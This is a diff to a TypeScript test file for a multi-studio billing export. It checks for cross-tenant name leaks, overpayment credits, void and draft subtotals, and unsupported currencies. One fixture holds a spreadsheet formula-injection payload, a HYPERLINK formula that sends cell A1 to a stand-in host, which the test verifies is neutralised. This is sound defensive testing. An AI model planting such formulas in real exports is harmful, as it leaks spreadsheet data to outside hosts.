@@ -14,6 +14,7 @@ import {
   resolveInvoicePayerName,
   studioBillingExportFilename,
   studioBillingManifestText,
+  unsupportedCurrencyCodes,
   type BillingExportSheet,
   type RawClientRecordRow,
   type RawHouseholdRow,
@@ -373,6 +374,10 @@ function source(
     households: HOUSEHOLDS,
     nullStudioInvoiceCount: 1,
     otherStudioInvoiceCount: 1,
+    // The head-only figure. 0 here because these fixtures hand the foreign
+    // project to the BUILDER, which is the leg under test; the F1 block below
+    // exercises the caller's count beside it.
+    invoiceProjectsOutsideStudioCount: 0,
     ...overrides,
   };
 }
@@ -485,6 +490,221 @@ describe("buildStudioBillingExport — the tenant leg", () => {
   });
 });
 
+// ═══════════════════════════════════════════════════════════════════════════
+// THE NAME-KEYED LEAKS (SQ-166 F1/F2/F3).
+//
+// Every assertion above keys on the foreign studio's ID, and that is why two
+// cross-tenant writes walked straight past a suite of 26: the foreign rows
+// arrived by NAME, through a project and a household that the dropped foreign
+// INVOICE never touched. `expect(flat).not.toContain(STUDIO_B)` cannot see a
+// project name. These fixtures give the foreign rows names that exist nowhere in
+// this studio's own data, and assert on the names.
+// ═══════════════════════════════════════════════════════════════════════════
+
+const FOREIGN_PROJECT_NAME = "OTHER STUDIO SECRET HOUSE";
+const FOREIGN_CLIENT_NAME = "OTHER STUDIO SECRET CLIENT";
+const FOREIGN_HOUSEHOLD_NAME = "OTHER STUDIO HOUSEHOLD";
+const FORMULA_STUDIO_NAME = '=HYPERLINK("http://x/"&A1,"claim")';
+
+function flatten(built: { sheets: BillingExportSheet[] }): string {
+  return JSON.stringify(built.sheets);
+}
+
+/** Every string cell in the workbook, header rows included. */
+function stringCells(built: { sheets: BillingExportSheet[] }): string[] {
+  const out: string[] = [];
+  for (const s of built.sheets) {
+    out.push(...s.header);
+    for (const row of s.rows)
+      for (const cell of row) if (typeof cell === "string") out.push(cell);
+  }
+  return out;
+}
+
+describe("buildStudioBillingExport — the cross-tenant NAME leaks", () => {
+  // F1 — a studio-A invoice whose project_id names a studio-B project. Legal:
+  // `invoices.studio_id` is immutable once set (00578:8750-8757), but the
+  // origin-deposit adoption (00578:8730-8746) moves a project-less invoice onto
+  // `agreement.project_id` without requiring the two studios to match.
+  const FOREIGN_PROJECT: RawProjectRow = {
+    id: "proj-b2",
+    name: FOREIGN_PROJECT_NAME,
+    studio_id: STUDIO_B,
+    client_id: "client-b2",
+    client: {
+      id: "client-b2",
+      full_name: FOREIGN_CLIENT_NAME,
+      display_name: null,
+      email: "bee@b.example",
+    },
+  };
+  const INVOICE_ON_A_FOREIGN_PROJECT = invoice({
+    id: "inv-a-onto-b",
+    client_id: null,
+    project_id: "proj-b2",
+    invoice_number: "INV-0101",
+    client: null,
+  });
+  const FOREIGN_CLIENT_RECORD = clientRecord({
+    id: "dc-b2",
+    client_id: "client-b2",
+    household_id: "hh-b",
+    client_name: FOREIGN_CLIENT_NAME,
+    client_email: "bee@b.example",
+    client_phone: "555-0100",
+    client: {
+      id: "client-b2",
+      full_name: FOREIGN_CLIENT_NAME,
+      display_name: null,
+      email: "bee@b.example",
+    },
+  });
+
+  const f1 = () =>
+    buildStudioBillingExport(
+      source({
+        invoices: [INVOICE_ON_A_FOREIGN_PROJECT],
+        lines: [],
+        payments: [],
+        projects: [FOREIGN_PROJECT],
+        clientRecords: [FOREIGN_CLIENT_RECORD],
+        nullStudioInvoiceCount: 0,
+        otherStudioInvoiceCount: 0,
+        invoiceProjectsOutsideStudioCount: 1,
+      }),
+    );
+
+  it("never names another studio’s project on an invoice of this one", () => {
+    const built = f1();
+    const invoices = sheet(built, "invoices");
+    expect(cells(invoices, "invoice_id")).toEqual(["inv-a-onto-b"]);
+    expect(cells(invoices, "project_name")).toEqual([null]);
+    expect(flatten(built)).not.toContain(FOREIGN_PROJECT_NAME);
+    // The stored project_id STAYS: it is a column of this studio's own invoice
+    // row, an opaque id and not a name, and a file that dropped it would not
+    // reconcile against the book.
+    expect(cells(invoices, "project_id")).toEqual(["proj-b2"]);
+  });
+
+  it("never admits the foreign project’s client as this studio’s payer", () => {
+    const built = f1();
+    const invoices = sheet(built, "invoices");
+    expect(cells(invoices, "client_id")).toEqual([null]);
+    expect(cells(invoices, "client_name")).toEqual([null]);
+    expect(sheet(built, "clients").rows).toEqual([]);
+    const flat = flatten(built);
+    expect(flat).not.toContain(FOREIGN_CLIENT_NAME);
+    expect(flat).not.toContain("bee@b.example");
+    expect(flat).not.toContain("555-0100");
+  });
+
+  it("counts the foreign project on both legs and writes neither", () => {
+    const built = f1();
+    expect(
+      manifestValue(built, "exclusions", "projects_read_naming_another_studio"),
+    ).toBe(1);
+    expect(
+      manifestValue(
+        built,
+        "exclusions",
+        "projects_named_by_an_invoice_outside_this_studio",
+      ),
+    ).toBe(1);
+    expect(
+      manifestValue(built, "exclusions", "client_records_without_studio_path"),
+    ).toBe(1);
+  });
+
+  // F2 — a studio-A invoice with no payer at all, on a studio-A project that
+  // carries no client, and a designer whose ONLY named email-only roster row
+  // belongs to her OTHER studio's household. 00588 step 4 names it; here it is
+  // the one step no payer id anchors.
+  const A_PROJECT_WITH_NO_CLIENT: RawProjectRow = {
+    id: "proj-a2",
+    name: "Hollis House",
+    studio_id: STUDIO_A,
+    client_id: null,
+    client: null,
+  };
+  const INVOICE_WITH_NO_PAYER = invoice({
+    id: "inv-a-nopayer",
+    client_id: null,
+    project_id: "proj-a2",
+    invoice_number: "INV-0102",
+    client: null,
+  });
+
+  const withRoster = (rows: RawClientRecordRow[]) =>
+    buildStudioBillingExport(
+      source({
+        invoices: [INVOICE_WITH_NO_PAYER],
+        lines: [],
+        payments: [],
+        projects: [A_PROJECT_WITH_NO_CLIENT],
+        clientRecords: rows,
+        nullStudioInvoiceCount: 0,
+        otherStudioInvoiceCount: 0,
+      }),
+    );
+
+  it("never names a co-member’s other-studio household as this studio’s payer", () => {
+    const built = withRoster([
+      clientRecord({
+        id: "dc-b3",
+        client_id: null,
+        household_id: "hh-b",
+        client_name: FOREIGN_HOUSEHOLD_NAME,
+        client_email: null,
+        client: null,
+      }),
+    ]);
+    const invoices = sheet(built, "invoices");
+    expect(cells(invoices, "project_name")).toEqual(["Hollis House"]);
+    expect(cells(invoices, "client_name")).toEqual([null]);
+    expect(flatten(built)).not.toContain(FOREIGN_HOUSEHOLD_NAME);
+    // The clients sheet already refused this very row for having no studio
+    // authorization path; the invoices sheet now agrees with it instead of
+    // printing the name it excluded.
+    expect(sheet(built, "clients").rows).toEqual([]);
+    expect(
+      manifestValue(built, "exclusions", "client_records_without_studio_path"),
+    ).toBe(1);
+  });
+
+  it("still names the single email-only lead when the household is this studio’s", () => {
+    const built = withRoster([
+      clientRecord({
+        id: "dc-a4",
+        client_id: null,
+        household_id: "hh-a",
+        client_name: "Jodi Kurhn",
+        client_email: null,
+        client: null,
+      }),
+    ]);
+    expect(cells(sheet(built, "invoices"), "client_name")).toEqual([
+      "Jodi Kurhn",
+    ]);
+  });
+
+  // F3 — the manifest sheet wrote `e.value` raw, and `studio_name` is the
+  // studio's own free text.
+  it("neutralises a formula-shaped studio name on the manifest sheet", () => {
+    const built = buildStudioBillingExport(
+      source({ studioName: FORMULA_STUDIO_NAME }),
+    );
+    const manifest = sheet(built, "manifest");
+    const at = cells(manifest, "key").indexOf("studio_name");
+    expect(manifest.rows[at][column(manifest, "value")]).toBe(
+      `'${FORMULA_STUDIO_NAME}`,
+    );
+    // The invariant underneath: NO cell anywhere in the workbook may open with a
+    // sigil a spreadsheet evaluates — least of all on the manifest, the sheet a
+    // bookkeeper opens first.
+    expect(stringCells(built).filter((c) => /^[=+@-]/.test(c))).toEqual([]);
+  });
+});
+
 describe("buildStudioBillingExport — the studio-less invoice disclosure", () => {
   it("discloses the count of readable invoices carrying no studio (00318/00513)", () => {
     const built = buildStudioBillingExport(source());
@@ -544,6 +764,9 @@ describe("buildStudioBillingExport — the studio invoice with no project", () =
 });
 
 describe("resolveInvoicePayerName — 00588, step for step", () => {
+  /** Step 4's tenant leg: the households THIS studio owns. `hh-b` is the
+   *  co-member's other studio and is deliberately absent. */
+  const studioHouseholds = new Set(["hh-a"]);
   const roster = new Map([[DESIGNER, CLIENT_RECORDS]]);
   const profiles = new Map([
     [
@@ -575,6 +798,7 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
         ],
       ]),
       profiles,
+      studioHouseholds,
     );
     expect(name).toBe("signup-a2@example.com");
   });
@@ -607,6 +831,7 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
         null,
         both,
         profiles,
+        studioHouseholds,
       ),
     ).toBe("Okonkwo residence");
   });
@@ -644,6 +869,7 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
         null,
         both,
         profiles,
+        studioHouseholds,
       ),
     ).toBe("Jodi Kurhn");
   });
@@ -654,17 +880,30 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
       PROJECTS[0],
       roster,
       new Map(),
+      studioHouseholds,
     );
     expect(name).toBe("Adaeze Okonkwo");
   });
 
   it("names nobody rather than guess when two email-only leads could answer", () => {
+    // Both carry a household of THIS studio, so step 4's tenant leg admits both
+    // and it is the ambiguity rule — not the tenant leg — that names nobody.
     const two = new Map([
       [
         DESIGNER,
         [
-          clientRecord({ id: "l1", client_id: null, client_name: "Lead one" }),
-          clientRecord({ id: "l2", client_id: null, client_name: "Lead two" }),
+          clientRecord({
+            id: "l1",
+            client_id: null,
+            household_id: "hh-a",
+            client_name: "Lead one",
+          }),
+          clientRecord({
+            id: "l2",
+            client_id: null,
+            household_id: "hh-a",
+            client_name: "Lead two",
+          }),
         ],
       ],
     ]);
@@ -674,6 +913,7 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
         null,
         two,
         new Map(),
+        studioHouseholds,
       ),
     ).toBeNull();
   });
@@ -686,9 +926,15 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
           clientRecord({
             id: "l1",
             client_id: null,
+            household_id: "hh-a",
             client_name: "Jodi Kurhn",
           }),
-          clientRecord({ id: "l2", client_id: null, client_name: null }),
+          clientRecord({
+            id: "l2",
+            client_id: null,
+            household_id: "hh-a",
+            client_name: null,
+          }),
         ],
       ],
     ]);
@@ -698,6 +944,7 @@ describe("resolveInvoicePayerName — 00588, step for step", () => {
         null,
         one,
         new Map(),
+        studioHouseholds,
       ),
     ).toBe("Jodi Kurhn");
   });
@@ -869,6 +1116,111 @@ describe("the manifest", () => {
     expect(text).toContain("[exclusions]");
     expect(text).toContain("invoices_with_null_studio_id = 1");
     expect(text).toContain("[missing_values]");
+  });
+});
+
+describe("buildStudioBillingExport — an overpayment and the void/draft subtotal", () => {
+  const only = (invoices: RawInvoiceRow[]) =>
+    buildStudioBillingExport(
+      source({
+        invoices,
+        lines: [],
+        payments: [],
+        nullStudioInvoiceCount: 0,
+        otherStudioInvoiceCount: 0,
+      }),
+    );
+
+  // F5 — `Math.max(total - paid, 0)` read an overpayment as a zero balance, and
+  // the credit then appeared in no column at all.
+  it("carries an overpayment as a negative balance AND as a credit", () => {
+    const built = only([
+      invoice({
+        id: "inv-a-over",
+        invoice_number: "INV-0103",
+        project_id: null,
+        status: "paid",
+        subtotal_cents: 100_000,
+        tax_rate: 0,
+        tax_cents: 0,
+        total_cents: 100_000,
+        amount_paid_cents: 150_000,
+      }),
+    ]);
+    const invoices = sheet(built, "invoices");
+    expect(cells(invoices, "balance_minor")).toEqual([-50_000]);
+    expect(cells(invoices, "balance_decimal")).toEqual([-500]);
+    expect(cells(invoices, "credit_minor")).toEqual([50_000]);
+    expect(manifestValue(built, "reconciliation", "balance_minor")).toBe(
+      -50_000,
+    );
+    expect(manifestValue(built, "reconciliation", "credit_minor")).toBe(50_000);
+  });
+
+  // F6 — voided and draft invoices belong in the file and are labelled, but they
+  // are not money anyone owes, and `total_billed_minor` alone said they were.
+  it("subtotals the voided and draft invoices out of total_billed", () => {
+    const built = only([
+      invoice(),
+      invoice({
+        id: "inv-a-void",
+        invoice_number: null,
+        status: "void",
+        total_cents: 50_000,
+        amount_paid_cents: 0,
+        voided_at: "2026-09-12T00:00:00Z",
+      }),
+      invoice({
+        id: "inv-a-draft",
+        invoice_number: null,
+        status: "draft",
+        total_cents: 10_000,
+        amount_paid_cents: 0,
+      }),
+    ]);
+    expect(manifestValue(built, "reconciliation", "total_billed_minor")).toBe(
+      168_750,
+    );
+    expect(
+      manifestValue(
+        built,
+        "reconciliation",
+        "total_billed_excluding_void_draft_minor",
+      ),
+    ).toBe(108_750);
+    expect(
+      manifestValue(built, "reconciliation", "voided_or_draft_billed_minor"),
+    ).toBe(60_000);
+    expect(
+      manifestValue(built, "reconciliation", "voided_or_draft_invoices"),
+    ).toBe(2);
+  });
+});
+
+// F7 — `decimal()` divides by 100 unconditionally, and `invoices.currency` is
+// TEXT with no CHECK. The fetch aborts on a currency this cannot convert.
+describe("unsupportedCurrencyCodes", () => {
+  it("passes every currency whose minor unit is 1/100, blank meaning USD", () => {
+    expect(
+      unsupportedCurrencyCodes([
+        { currency: "USD" },
+        { currency: "cad" },
+        { currency: " EUR " },
+        { currency: "GBP" },
+        { currency: null },
+      ]),
+    ).toEqual([]);
+  });
+
+  it("names each currency decimal() would divide wrongly, once, so the read can abort", () => {
+    expect(
+      unsupportedCurrencyCodes([
+        { currency: "USD" },
+        { currency: "JPY" },
+        { currency: "KWD" },
+        { currency: "JPY" },
+      ]),
+    ).toEqual(["JPY", "KWD"]);
   });
 });
 
